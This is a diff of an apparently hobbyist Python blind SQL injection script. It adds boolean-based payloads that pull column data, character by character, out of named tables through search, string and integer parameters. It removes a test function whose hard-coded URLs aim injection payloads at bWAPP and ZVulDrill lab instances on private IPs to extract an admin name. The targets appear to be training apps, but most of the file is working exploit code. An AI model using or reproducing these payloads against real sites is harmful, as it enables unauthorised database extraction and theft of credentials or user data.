@@ -19,8 +19,10 @@ from urllib import request
 from data import glovar, glofun
 
 
+#得出单列数据
+
 def get_tbname(url=glovar.url3, cookie=False, type='search',
-                    tbname='comment', coname='comment_text',rowcount=1):
+                    tbname='comment', coname='comment_text',rowcount=10):
 
     response_length = 0
 
@@ -30,17 +32,20 @@ def get_tbname(url=glovar.url3, cookie=False, type='search',
 
 
     if type == 'int':
-        payload = '+or+if((select+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=' + tbname + '+limit+{tbname_order_number},1),{tbname_str_location},1))={ascii_number}),1,0)'
+        payload = '+or+if((select+ascii(substr((select+'+ coname +'+from+' + tbname + '+limit+{data_row_order},1),{data_location},1))={ascii_number}),1,0)'
     elif type == 'string':
-        payload = '\'+or+if((select+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=' + tbname + '+limit+{tbname_order_number},1),{tbname_str_location},1))={ascii_number}),1,0)%23'
+        payload = '\'+or+if((select+ascii(substr((select+'+ coname +'+from+' + tbname + '+limit+{data_row_order},1),{data_location},1))={ascii_number}),1,0)%23'
     elif type == 'search':
         payload = '%\'+or+if((select+ascii(substr((select+'+ coname +'+from+' + tbname + '+limit+{data_row_order},1),{data_location},1))={ascii_number}),1,0)%23'
 
-    payloads = ["0", "95", "97", "98", "99", "100", "101", "102", "103", "104", "105", "106", "107", "108", "109",
+    payloads = ["0","32","46", "58","95", "97", "98", "99", "100", "101", "102", "103", "104", "105", "106", "107", "108", "109",
                 "110", "111", "112", "113", "114", "115", "116", "117", "118", "119", "120", "121", "122",
                 "48", "49", "50", "51", "52", "53", "54", "55", "56", "57"]
 
-    # _ 95    NULL 0
+    for i in range(65,91):
+        payloads.append(str(i))
+
+    #0 NULL 32 space 95 _
 
     for i in range(0, rowcount):
 
@@ -89,40 +94,15 @@ def get_tbname(url=glovar.url3, cookie=False, type='search',
 
     print(tbname_list)
 
-def get_dbname_test2(cookie=glovar.cookie):
-
-    response_length = 0
-
-    hex_dbname = ""
-
-    tbname = ""
-
-    tbname_list = []
-
-
-#    full_payload = 'http://172.30.61.112/bWAPP/bWAPP/sqli_2.php?\'action=go&movie=100+or+if((select+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=0x6277617070+limit+0,1),1,1))=98),1,0)'
-    full_payload='http://172.30.61.112/ZVulDrill-master/search.php?search=1\'+or+if((select+ascii(substr((select+admin_name+from+admin+limit+0,1),1,1))=97),1,0)%23'
-
-    print(full_payload)
-
-    url_response = urllib.request.Request(full_payload)
-
-
-    #url_response.add_header('Cookie', cookie)
-
-    url_read = request.urlopen(url_response).read()
-
-    url_read_length = len(url_read)
-
-    print(url_read_length)
-
 
 
 
 if __name__ == "__main__":
 
-    get_tbname(url=glovar.url3)
+    #get_tbname(url=glovar.url3, cookie=False, type='search',tbname='comment', coname='comment_id',rowcount=9)
 
-    #get_dbname(glovar.url4, cookie=glovar.cookie, type='int', dbname='bwapp',tbcount=5)
+    get_tbname(glovar.url4, cookie=glovar.cookie, type='int', tbname='movies', coname='title',rowcount=9)
+
+
 
     #get_dbname_test2()
